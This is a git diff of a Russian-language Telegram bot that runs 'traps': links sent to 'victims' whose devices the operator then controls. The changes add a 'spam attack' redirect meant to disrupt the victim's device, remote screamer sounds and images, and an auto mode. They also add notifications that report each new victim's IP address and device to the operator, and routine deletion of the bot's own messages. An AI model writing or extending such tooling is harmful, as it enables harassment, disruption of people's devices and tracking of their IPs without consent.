@@ -30,8 +30,9 @@ const bot = new TelegramBot(token, {
 
 const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
 const wizardState = {};
+const userMessages = {}; // Храним ID сообщений для удаления
 
-console.log('🚀 NFC Bot запускается...');
+console.log('🚀 NFC Bot Premium запускается...');
 
 // --- ГЕНЕРАТОР КОДА ---
 function generateShortCode() {
@@ -40,6 +41,28 @@ function generateShortCode() {
     for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
     if (global.shortLinks && global.shortLinks[result]) return generateShortCode();
     return result;
+}
+
+// --- УДАЛЕНИЕ СТАРЫХ СООБЩЕНИЙ ---
+async function deleteOldMessages(chatId) {
+    if (userMessages[chatId] && userMessages[chatId].length > 0) {
+        for (const msgId of userMessages[chatId]) {
+            try {
+                await bot.deleteMessage(chatId, msgId);
+            } catch (e) {
+                // Игнорируем ошибки удаления
+            }
+        }
+        userMessages[chatId] = [];
+    }
+}
+
+// --- СОХРАНЕНИЕ ID СООБЩЕНИЯ ---
+function saveMessageId(chatId, messageId) {
+    if (!userMessages[chatId]) {
+        userMessages[chatId] = [];
+    }
+    userMessages[chatId].push(messageId);
 }
 
 // --- ЗАГРУЗКА ФАЙЛОВ ---
@@ -120,6 +143,8 @@ bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
     const userName = msg.from.first_name || 'Пользователь';
     
+    await deleteOldMessages(chatId);
+    
     const welcomeText = `
 🎭 <b>NFC Control Premium</b>
 
@@ -131,15 +156,16 @@ bot.onText(/\/start/, async (msg) => {
 • 🎯 Создание ловушек с кастомным контентом
 • 🔊 Скримеры с любым звуком
 • 🖼 Фоновые изображения и стикеры
-• ☢️ Лаги на устройства
+• ☢️ Спам-атаки на устройства
 • 📊 Детальная статистика переходов
 
 Выбери действие в меню ниже 👇`;
 
-    bot.sendMessage(chatId, welcomeText, {
+    const sentMsg = await bot.sendMessage(chatId, welcomeText, {
         parse_mode: 'HTML',
         reply_markup: getMainMenu()
     });
+    saveMessageId(chatId, sentMsg.message_id);
 });
 
 // --- ОБРАБОТКА CALLBACK КНОПОК ---
@@ -150,18 +176,20 @@ bot.on('callback_query', async (query) => {
 
     // Главное меню
     if (data === 'main_menu') {
+        await deleteOldMessages(chatId);
+        
         const text = `
 🎭 <b>NFC Control Premium</b>
 
 Главное меню системы управления пранками.
 Выбери нужное действие 👇`;
 
-        bot.editMessageText(text, {
-            chat_id: chatId,
-            message_id: messageId,
+        const sentMsg = await bot.sendMessage(chatId, text, {
             parse_mode: 'HTML',
             reply_markup: getMainMenu()
         });
+        saveMessageId(chatId, sentMsg.message_id);
+        
         bot.answerCallbackQuery(query.id);
         return;
     }
@@ -169,6 +197,8 @@ bot.on('callback_query', async (query) => {
     // Создать новую ловушку
     if (data === 'create_new') {
         wizardState[chatId] = { step: 1, data: {} };
+        
+        await deleteOldMessages(chatId);
         
         const text = `
 <b>🎯 Создание новой ловушки</b>
@@ -182,9 +212,7 @@ bot.on('callback_query', async (query) => {
 
 Или напиши <code>skip</code> чтобы пропустить этот шаг.`;
 
-        bot.editMessageText(text, {
-            chat_id: chatId,
-            message_id: messageId,
+        const sentMsg = await bot.sendMessage(chatId, text, {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
@@ -192,6 +220,8 @@ bot.on('callback_query', async (query) => {
                 ]
             }
         });
+        saveMessageId(chatId, sentMsg.message_id);
+        
         bot.answerCallbackQuery(query.id, { text: '🎯 Начинаем создание...' });
         return;
     }
@@ -205,9 +235,9 @@ bot.on('callback_query', async (query) => {
         
         const sessions = Object.values(global.sessions);
         if (sessions.length === 0) {
-            bot.editMessageText('📂 <b>Мои сессии</b>\n\nУ вас пока нет активных сессий.\nСоздайте первую ловушку! 🎯', {
-                chat_id: chatId,
-                message_id: messageId,
+            await deleteOldMessages(chatId);
+            
+            const sentMsg = await bot.sendMessage(chatId, '📂 <b>Мои сессии</b>\n\nУ вас пока нет активных сессий.\nСоздайте первую ловушку! 🎯', {
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
@@ -216,14 +246,18 @@ bot.on('callback_query', async (query) => {
                     ]
                 }
             });
+            saveMessageId(chatId, sentMsg.message_id);
+            
             bot.answerCallbackQuery(query.id);
             return;
         }
 
         const recentSessions = sessions.slice(-5).reverse();
         
-        bot.deleteMessage(chatId, messageId).catch(() => {});
-        bot.sendMessage(chatId, `📂 <b>Ваши последние ${recentSessions.length} сессий:</b>`, { parse_mode: 'HTML' });
+        await deleteOldMessages(chatId);
+        
+        const headerMsg = await bot.sendMessage(chatId, `📂 <b>Ваши последние ${recentSessions.length} сессий:</b>`, { parse_mode: 'HTML' });
+        saveMessageId(chatId, headerMsg.message_id);
         
         for (const s of recentSessions) {
             await new Promise(resolve => setTimeout(resolve, 300));
@@ -244,6 +278,8 @@ bot.on('callback_query', async (query) => {
             totalVictims += s.totalVictims || 0;
         });
 
+        await deleteOldMessages(chatId);
+
         const statsText = `
 📊 <b>Общая статистика</b>
 
@@ -255,9 +291,7 @@ bot.on('callback_query', async (query) => {
 
 📅 <b>Обновлено:</b> ${new Date().toLocaleString('ru-RU')}`;
 
-        bot.editMessageText(statsText, {
-            chat_id: chatId,
-            message_id: messageId,
+        const sentMsg = await bot.sendMessage(chatId, statsText, {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
@@ -266,12 +300,16 @@ bot.on('callback_query', async (query) => {
                 ]
             }
         });
+        saveMessageId(chatId, sentMsg.message_id);
+        
         bot.answerCallbackQuery(query.id, { text: '📊 Статистика обновлена' });
         return;
     }
 
     // Инструкция
     if (data === 'guide') {
+        await deleteOldMessages(chatId);
+        
         const guideText = `
 📖 <b>Инструкция по использованию</b>
 
@@ -284,8 +322,9 @@ bot.on('callback_query', async (query) => {
 
 <b>Управление:</b>
 🔊 <b>Скример</b> - воспроизвести звук
-☢️ <b>Запустить лаги</b> - отправит на сайт с лагами
-🔄 <b>Обновить</b> - обновить информацию
+☢️ <b>Спам</b> - редирект на атаку
+🖼 <b>Изменить фон</b> - заменить изображение
+🔊 <b>Изменить звук</b> - заменить аудио
 ❌ <b>Удалить</b> - удалить сессию
 
 <b>Форматы файлов:</b>
@@ -296,9 +335,7 @@ bot.on('callback_query', async (query) => {
 
 <b>💡 Совет:</b> Используйте короткие звуки (до 10 сек) для лучшего эффекта скримера.`;
 
-        bot.editMessageText(guideText, {
-            chat_id: chatId,
-            message_id: messageId,
+        const sentMsg = await bot.sendMessage(chatId, guideText, {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [
@@ -306,13 +343,49 @@ bot.on('callback_query', async (query) => {
                 ]
             }
         });
+        saveMessageId(chatId, sentMsg.message_id);
+        
         bot.answerCallbackQuery(query.id, { text: '📖 Инструкция' });
         return;
     }
 
     // Управление сессиями
     if (data.includes('_')) {
-        const [action, sessionId] = data.split('_');
+        const parts = data.split('_');
+        const action = parts[0];
+        const sessionId = parts.slice(1).join('_'); // На случай если в ID есть _
+        
+        // Для удаления не проверяем существование сессии
+        if (action === 'confirm') {
+            const actualAction = parts[1]; // confirm_del_sessionId
+            const actualSessionId = parts.slice(2).join('_');
+            
+            if (actualAction === 'del') {
+                const s = global.sessions[actualSessionId];
+                
+                if (s && global.shortLinks[s.shortCode]) {
+                    delete global.shortLinks[s.shortCode];
+                }
+                if (global.sessions[actualSessionId]) {
+                    delete global.sessions[actualSessionId];
+                }
+                
+                await deleteOldMessages(chatId);
+                
+                const sentMsg = await bot.sendMessage(chatId, '✅ Сессия успешно удалена', {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
+                        ]
+                    }
+                });
+                saveMessageId(chatId, sentMsg.message_id);
+                
+                bot.answerCallbackQuery(query.id, { text: '✅ Удалено' });
+                return;
+            }
+        }
+        
         const s = global.sessions ? global.sessions[sessionId] : null;
 
         if (!s && action !== 'del') {
@@ -336,13 +409,26 @@ bot.on('callback_query', async (query) => {
                 bot.answerCallbackQuery(query.id, { text: '☢️ Спам-атака запущена!', show_alert: true });
                 break;
 
+            case 'auto':
+                s.autoMode = !s.autoMode;
+                global.io.to(sessionId).emit('update-media', { sound: s.sound, image: s.image, auto: s.autoMode });
+                
+                // Обновляем панель
+                await deleteOldMessages(chatId);
+                sendControlPanel(chatId, sessionId);
+                
+                bot.answerCallbackQuery(query.id, { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}` });
+                break;
+
             case 'refresh':
-                bot.deleteMessage(chatId, messageId).catch(() => {});
+                await deleteOldMessages(chatId);
                 sendControlPanel(chatId, sessionId);
                 bot.answerCallbackQuery(query.id, { text: '🔄 Обновлено' });
                 break;
 
             case 'del':
+                await deleteOldMessages(chatId);
+                
                 const confirmText = `
 ⚠️ <b>Подтверждение удаления</b>
 
@@ -353,9 +439,7 @@ bot.on('callback_query', async (query) => {
 
 <b>Это действие необратимо!</b>`;
 
-                bot.editMessageText(confirmText, {
-                    chat_id: chatId,
-                    message_id: messageId,
+                const sentMsg = await bot.sendMessage(chatId, confirmText, {
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -366,22 +450,9 @@ bot.on('callback_query', async (query) => {
                         ]
                     }
                 });
-                bot.answerCallbackQuery(query.id);
-                break;
-
-            case 'confirm_del':
-                if (global.sessions[sessionId]) delete global.sessions[sessionId];
-                if (s && global.shortLinks[s.shortCode]) delete global.shortLinks[s.shortCode];
+                saveMessageId(chatId, sentMsg.message_id);
                 
-                bot.deleteMessage(chatId, messageId).catch(() => {});
-                bot.sendMessage(chatId, '✅ Сессия успешно удалена', {
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
-                        ]
-                    }
-                });
-                bot.answerCallbackQuery(query.id, { text: '✅ Удалено' });
+                bot.answerCallbackQuery(query.id);
                 break;
 
             case 'info':
@@ -395,6 +466,7 @@ bot.on('callback_query', async (query) => {
 <b>Настройки:</b>
 • Фон: ${s.image ? '✅ Установлен' : '❌ Не установлен'}
 • Звук: ${s.sound ? '✅ Установлен' : '❌ Не установлен'}
+• Авто-режим: ${s.autoMode ? '🟢 Включен' : '🔴 Выключен'}
 
 <b>Статистика:</b>
 • Всего переходов: ${s.totalVictims}
@@ -402,7 +474,7 @@ bot.on('callback_query', async (query) => {
 
                 bot.answerCallbackQuery(query.id, { text: 'ℹ️ Подробная информация', show_alert: false });
                 
-                bot.sendMessage(chatId, infoText, {
+                const infoMsg = await bot.sendMessage(chatId, infoText, {
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -410,6 +482,35 @@ bot.on('callback_query', async (query) => {
                         ]
                     }
                 });
+                saveMessageId(chatId, infoMsg.message_id);
+                break;
+
+            case 'edit':
+                const editType = parts[1]; // edit_image или edit_sound
+                const editSessionId = parts.slice(2).join('_');
+                
+                wizardState[chatId] = { 
+                    step: editType === 'image' ? 'edit_image' : 'edit_sound', 
+                    sessionId: editSessionId 
+                };
+                
+                await deleteOldMessages(chatId);
+                
+                const editText = editType === 'image' 
+                    ? '<b>🖼 Изменение фона</b>\n\nОтправь новое фото, стикер или видео.\nНапиши <code>skip</code> для отмены.'
+                    : '<b>🔊 Изменение звука</b>\n\nОтправь новый аудиофайл, голосовое или видео.\nНапиши <code>skip</code> для отмены.';
+                
+                const editMsg = await bot.sendMessage(chatId, editText, {
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '❌ Отменить', callback_data: `refresh_${editSessionId}` }]
+                        ]
+                    }
+                });
+                saveMessageId(chatId, editMsg.message_id);
+                
+                bot.answerCallbackQuery(query.id, { text: editType === 'image' ? '🖼 Ожидаю новый фон...' : '🔊 Ожидаю новый звук...' });
                 break;
         }
     }
@@ -426,6 +527,128 @@ bot.on('message', async (msg) => {
     // --- WIZARD ---
     if (wizardState[chatId]) {
         const st = wizardState[chatId];
+
+        // РЕДАКТИРОВАНИЕ ИЗОБРАЖЕНИЯ
+        if (st.step === 'edit_image') {
+            if (text && text.toLowerCase() === 'skip') {
+                delete wizardState[chatId];
+                await deleteOldMessages(chatId);
+                sendControlPanel(chatId, st.sessionId);
+                return;
+            }
+
+            const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Обработка нового фона...</b>', { parse_mode: 'HTML' });
+            
+            try {
+                let newImage = '';
+                
+                if (msg.photo) {
+                    const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
+                    newImage = f.url || '';
+                } 
+                else if (msg.sticker) {
+                    const f = await downloadFile(msg.sticker.file_id, 'sticker');
+                    if (f.path) {
+                        const converted = await convertStickerToImage(f.path);
+                        newImage = converted.url || '';
+                    }
+                }
+                else {
+                    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+                    bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь фото или стикер', {
+                        parse_mode: 'HTML'
+                    });
+                    return;
+                }
+
+                // Обновляем сессию
+                if (global.sessions[st.sessionId]) {
+                    global.sessions[st.sessionId].image = newImage;
+                    global.io.to(st.sessionId).emit('update-media', { 
+                        sound: global.sessions[st.sessionId].sound, 
+                        image: newImage,
+                        auto: global.sessions[st.sessionId].autoMode
+                    });
+                }
+
+                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+                
+                await deleteOldMessages(chatId);
+                const successMsg = await bot.sendMessage(chatId, '✅ <b>Фон успешно обновлён!</b>', { parse_mode: 'HTML' });
+                saveMessageId(chatId, successMsg.message_id);
+                
+                delete wizardState[chatId];
+                
+                setTimeout(() => sendControlPanel(chatId, st.sessionId), 500);
+            } catch (e) {
+                console.error(e);
+                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+            }
+            return;
+        }
+
+        // РЕДАКТИРОВАНИЕ ЗВУКА
+        if (st.step === 'edit_sound') {
+            if (text && text.toLowerCase() === 'skip') {
+                delete wizardState[chatId];
+                await deleteOldMessages(chatId);
+                sendControlPanel(chatId, st.sessionId);
+                return;
+            }
+
+            const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Загрузка нового звука...</b>', { parse_mode: 'HTML' });
+            
+            try {
+                let newSound = '';
+                
+                if (msg.audio) {
+                    const f = await downloadFile(msg.audio.file_id, 'snd');
+                    newSound = f.url || '';
+                }
+                else if (msg.voice) {
+                    const f = await downloadFile(msg.voice.file_id, 'voice');
+                    newSound = f.url || '';
+                }
+                else if (msg.video) {
+                    const f = await downloadFile(msg.video.file_id, 'video');
+                    if (f.path) {
+                        const audioData = await extractAudioFromVideo(f.path);
+                        newSound = audioData.url || '';
+                    }
+                }
+                else {
+                    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+                    bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь аудио, голосовое или видео', {
+                        parse_mode: 'HTML'
+                    });
+                    return;
+                }
+
+                // Обновляем сессию
+                if (global.sessions[st.sessionId]) {
+                    global.sessions[st.sessionId].sound = newSound;
+                    global.io.to(st.sessionId).emit('update-media', { 
+                        sound: newSound, 
+                        image: global.sessions[st.sessionId].image,
+                        auto: global.sessions[st.sessionId].autoMode
+                    });
+                }
+
+                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+                
+                await deleteOldMessages(chatId);
+                const successMsg = await bot.sendMessage(chatId, '✅ <b>Звук успешно обновлён!</b>', { parse_mode: 'HTML' });
+                saveMessageId(chatId, successMsg.message_id);
+                
+                delete wizardState[chatId];
+                
+                setTimeout(() => sendControlPanel(chatId, st.sessionId), 500);
+            } catch (e) {
+                console.error(e);
+                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+            }
+            return;
+        }
 
         // ШАГ 1: ФОН
         if (st.step === 1) {
@@ -460,7 +683,7 @@ bot.on('message', async (msg) => {
                 }
                 else {
                     bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
-                    bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь фото, стикер, видео или напиши <code>skip</code>', { 
+                    const errMsg = await bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь фото, стикер, видео или напиши <code>skip</code>', { 
                         parse_mode: 'HTML',
                         reply_markup: {
                             inline_keyboard: [
@@ -468,18 +691,20 @@ bot.on('message', async (msg) => {
                             ]
                         }
                     });
+                    saveMessageId(chatId, errMsg.message_id);
                     return;
                 }
             } catch (e) {
                 console.error(e);
                 bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
-                bot.sendMessage(chatId, '❌ Ошибка обработки файла. Попробуй снова.', {
+                const errMsg = await bot.sendMessage(chatId, '❌ Ошибка обработки файла. Попробуй снова.', {
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: '❌ Отменить', callback_data: 'main_menu' }]
                         ]
                     }
                 });
+                saveMessageId(chatId, errMsg.message_id);
                 return;
             }
 
@@ -491,7 +716,7 @@ bot.on('message', async (msg) => {
                 ? '✅ <b>Звук уже извлечён из видео!</b>\n\nМожешь отправить другой звук или напиши <code>skip</code> для завершения.' 
                 : '<b>Шаг 2 из 2: Звук для скримера</b>\n\nОтправь мне:\n• 🔊 Аудиофайл\n• 🎤 Голосовое сообщение\n• 🎬 Видео\n\nИли напиши <code>skip</code> чтобы пропустить.';
             
-            bot.sendMessage(chatId, soundText, { 
+            const stepMsg = await bot.sendMessage(chatId, soundText, { 
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
@@ -499,6 +724,7 @@ bot.on('message', async (msg) => {
                     ]
                 }
             });
+            saveMessageId(chatId, stepMsg.message_id);
             return;
         }
 
@@ -528,7 +754,7 @@ bot.on('message', async (msg) => {
                     }
                     else {
                         bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
-                        bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь аудио, голосовое или напиши <code>skip</code>', {
+                        const errMsg = await bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь аудио, голосовое или напиши <code>skip</code>', {
                             parse_mode: 'HTML',
                             reply_markup: {
                                 inline_keyboard: [
@@ -536,6 +762,7 @@ bot.on('message', async (msg) => {
                                 ]
                             }
                         });
+                        saveMessageId(chatId, errMsg.message_id);
                         return;
                     }
                 } catch (e) {
@@ -552,7 +779,7 @@ bot.on('message', async (msg) => {
 });
 
 // --- СОЗДАНИЕ СЕССИИ ---
-function finishSessionCreation(chatId, data) {
+async function finishSessionCreation(chatId, data) {
     const id = uuidv4();
     const code = generateShortCode();
 
@@ -561,7 +788,7 @@ function finishSessionCreation(chatId, data) {
         shortCode: code,
         image: data.image || '',
         sound: data.sound || '',
-        autoMode: true,
+        autoMode: false, // Авто-режим выключен по умолчанию
         totalVictims: 0,
         createdAt: new Date(),
         lastActiveAt: Date.now(),
@@ -571,6 +798,8 @@ function finishSessionCreation(chatId, data) {
 
     global.sessions[id] = session;
     global.shortLinks[code] = id;
+
+    await deleteOldMessages(chatId);
 
     const successText = `
 ✅ <b>Ловушка успешно создана!</b>
@@ -586,22 +815,24 @@ function finishSessionCreation(chatId, data) {
 
 Отправь ссылку жертве и управляй через панель! 🎮`;
 
-    bot.sendMessage(chatId, successText, { parse_mode: 'HTML' });
+    const successMsg = await bot.sendMessage(chatId, successText, { parse_mode: 'HTML' });
+    saveMessageId(chatId, successMsg.message_id);
     
     setTimeout(() => sendControlPanel(chatId, id), 500);
 }
 
 // --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
-function sendControlPanel(chatId, sessionId) {
+async function sendControlPanel(chatId, sessionId) {
     const s = global.sessions[sessionId];
     if (!s) {
-        bot.sendMessage(chatId, '⚠️ Сессия не найдена.', {
+        const errMsg = await bot.sendMessage(chatId, '⚠️ Сессия не найдена.', {
             reply_markup: {
                 inline_keyboard: [
                     [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
                 ]
             }
         });
+        saveMessageId(chatId, errMsg.message_id);
         return;
     }
 
@@ -611,6 +842,7 @@ function sendControlPanel(chatId, sessionId) {
     // Эмодзи статусов
     const bgStatus = s.image ? '🟢' : '🔴';
     const soundStatus = s.sound ? '🟢' : '🔴';
+    const autoStatus = s.autoMode ? '🟢' : '🔴';
     
     let statusText = `
 🎮 <b>Панель управления</b>
@@ -621,6 +853,7 @@ function sendControlPanel(chatId, sessionId) {
 ⚙️ <b>Настройки:</b>
 ${bgStatus} Фон: ${s.image ? 'Установлен' : 'Отсутствует'}
 ${soundStatus} Звук: ${s.sound ? 'Установлен' : 'Отсутствует'}
+${autoStatus} Авто-режим: ${s.autoMode ? 'Включен' : 'Выключен'}
 
 📊 <b>Статистика:</b>
 👥 Онлайн: <b>${victims.length}</b>
@@ -639,19 +872,69 @@ ${soundStatus} Звук: ${s.sound ? 'Установлен' : 'Отсутств�
             { text: '☢️ Спам-атака', callback_data: `bomb_${sessionId}` }
         ],
         [
-            { text: '🔄 Обновить', callback_data: `refresh_${sessionId}` },
+            { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}`, callback_data: `auto_${sessionId}` },
             { text: 'ℹ️ Подробнее', callback_data: `info_${sessionId}` }
+        ],
+        [
+            { text: '🖼 Изменить фон', callback_data: `edit_image_${sessionId}` },
+            { text: '🔊 Изменить звук', callback_data: `edit_sound_${sessionId}` }
         ],
         [
             { text: '❌ Удалить сессию', callback_data: `del_${sessionId}` }
         ]
     ];
 
-    bot.sendMessage(chatId, statusText, {
+    const panelMsg = await bot.sendMessage(chatId, statusText, {
         parse_mode: 'HTML',
         reply_markup: { inline_keyboard: keyboard }
-    }).catch(err => console.error('Ошибка отправки панели:', err.message));
+    }).catch(err => {
+        console.error('Ошибка отправки панели:', err.message);
+        return null;
+    });
+    
+    if (panelMsg) {
+        saveMessageId(chatId, panelMsg.message_id);
+        
+        // Сохраняем привязку сессии к чату для уведомлений
+        if (!s.subscribedChats) {
+            s.subscribedChats = [];
+        }
+        if (!s.subscribedChats.includes(chatId)) {
+            s.subscribedChats.push(chatId);
+        }
+    }
 }
+
+// --- УВЕДОМЛЕНИЕ О НОВОЙ ЖЕРТВЕ ---
+function notifyNewVictim(sessionId, victimInfo) {
+    const s = global.sessions[sessionId];
+    if (!s || !s.subscribedChats) return;
+    
+    const notificationText = `
+🎯 <b>Новая жертва онлайн!</b>
+
+🆔 Сессия: <code>${s.shortCode}</code>
+📱 Устройство: ${victimInfo.device}
+🌐 IP: ${victimInfo.ip}
+⏰ Время: ${new Date().toLocaleTimeString('ru-RU')}`;
+
+    // Отправляем уведомление всем подписанным чатам
+    s.subscribedChats.forEach(async (chatId) => {
+        try {
+            await deleteOldMessages(chatId);
+            const notifMsg = await bot.sendMessage(chatId, notificationText, { parse_mode: 'HTML' });
+            saveMessageId(chatId, notifMsg.message_id);
+            
+            // Отправляем обновленную панель
+            setTimeout(() => sendControlPanel(chatId, sessionId), 500);
+        } catch (e) {
+            console.error('Ошибка отправки уведомления:', e.message);
+        }
+    });
+}
+
+// Экспортируем для использования в server.js
+module.exports = { bot, notifyNewVictim };
 
 // --- ОБРАБОТКА ОШИБОК ---
 bot.on('polling_error', (error) => {
@@ -662,6 +945,4 @@ bot.on('error', (error) => {
     console.error('Bot error:', error.message);
 });
 
-console.log('✅ NFC Bot готов к работе!');
-
-module.exports = bot;
+console.log('✅ NFC Bot Premium готов к работе!');
